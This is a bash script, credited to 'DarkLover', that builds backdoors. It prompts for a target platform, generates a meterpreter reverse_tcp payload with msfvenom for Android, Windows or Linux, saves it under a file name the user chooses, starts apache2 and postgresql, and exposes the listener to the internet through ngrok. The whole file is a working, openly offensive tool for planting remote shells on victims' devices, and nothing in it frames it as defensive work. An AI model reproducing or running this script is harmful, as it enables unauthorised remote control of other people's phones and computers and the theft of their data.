#/bin/bash
# This Script Was Created By DarkLover
echo "\e[91m[*] \e[96mWhich Device You Want To Create Backdoor..\e[5m_\e[0m\n"
echo "\t\e[91m[1] \e[96mFor Android\e[0m\n"
echo "\t\e[91m[2] \e[96mFor Windows x86 Based Systems\e[0m\n"
echo "\t\e[91m[3] \e[96mFor Windows x64 Based Systems\e[0m\n"
echo "\t\e[91m[4] \e[96mFor Linux x86 Based Systems\e[0m\n"
echo "\t\e[91m[5] \e[96mFor Linux x64 Based Systems\e[0m\n"
echo "\e[91m[*] \e[96mSelect a Number:\e[5m_\e[0m\n"
read CAS
case $CAS in
1)
AUX=android/meterpreter/reverse_tcp
;;
2)
AUX=windows/x86/meterpreter/reverse_tcp
;;
3)
AUX=windows/x64/meterpreter/reverse_tcp
;;
4)
AUX=linux/x86/meterpreter/reverse_tcp
;;
5)
AUX=linux/x64/meterpreter/reverse_tcp
;;
*)
echo "\e[91m[*] \e[96mGiven Number is Not Valid\e[0m\n"
exit -1
;;
esac
echo "\n\e[91m[*] \e[96mYour's IP Address is Automatically Selected in 5 Sec\e[5m_\e[0m\n"
sleep 5
LHO=$(ifconfig eth0 | grep "inet " | cut -d: -f2 | awk '{ print $2}')
echo "\n\e[91m[*] \e[96mEnter Port:\e[5m_\e[0m\n"
read LPO
echo "\n\e[91m[*] \e[96mEnter File_Name.File_Format:\e[5m_\e[0m\n"
read FIL
CUD=$(pwd)
echo "\n\t\e[91m[*] \e[96mSelect Option:\e[5m_\e[0m"
echo "\n\t\e[91m[0] \e[96mPress 0 To Enter Your Option \e[0m" 
echo "\n\t\e[91m[1] \e[96mPress 1 For Default Option : /root/Desktop/ \e[0m" 
echo "\n\t\e[91m[2] \e[96mPress 2 For Current Directory : $CUD\e[0m\n"
read OPT
if [ $OPT -eq 1 ]
then
sav=/root/Desktop/
elif [ $OPT -eq 2 ]
then
sav=$CUD
else
echo "\n\e[91m[*] \e[96mEnter Where to Save:\e[5m_\e[0m\n"
read sav
fi
echo "\n\n\t\e[91m[*]\e[96mAuxilary:\t\e[5m\e[97m$AUX\e[0m" 
echo "\n\t\e[91m[*]\e[96mLocal Host:\t\e[5m\e[97m$LHO\e[0m" 
echo "\n\t\e[91m[*]\e[96mPort:\t\e[5m\e[97m$LPO\e[0m"
echo "\n\t\e[91m[*]\e[96mFile_Name:\t\e[5m\e[97m$FIL\e[0m" 
echo "\n\t\e[91m[*]\e[96mSaved:\t\e[5m\e[97m$sav\e[0m"
echo "\n\n\e[91m[*]\e[96mStarting to Create Payload in 5 Seconds:\e[0m\n"
sleep 5
echo "\n\e[91m[*]\e[96mCreating Payload:\e[5m_\e[0m\n"
msfvenom -p $AUX LHOST=$LHO LPORT=$LPO R >$sav$FIL
echo "\n\e[91m[*]\e[96mShall I Start Apache Server & Postgresql :1/0(Yes/No)\e[5m_\e[0m\n"
read Y
if [ $Y -eq 1 ]
then
{
echo "\n\e[91m[*]\e[96mStarting Apache2 Web Serever in 5 Seconds:\e[5m_\e[0m\n"
sleep 5
service apache2 start
echo "\n\e[91m[*]\e[96mStarting Postgresql Database in 5 Seconds:\e[5m_\e[0m\n"
sleep 5
service postgresql start
}
else
{
echo "\n\e[91m[*]\e[96mYou Declined..![X]\e[5m_\e[0m\n"
}
fi
echo "\n\e[91m[*]\e[96mEnter tcp/http for Ngrok :\e[5m_\e[0m\n"
read CON
echo "\n\e[91m[*]\e[96mTunneling $CON $LHO:$LPO Using Ngrok in 5 Seconds:\e[5m_\e[0m\n"
sleep 5
ngrok $CON $LHO:$LPO
#This Script Was Created By DarkLover
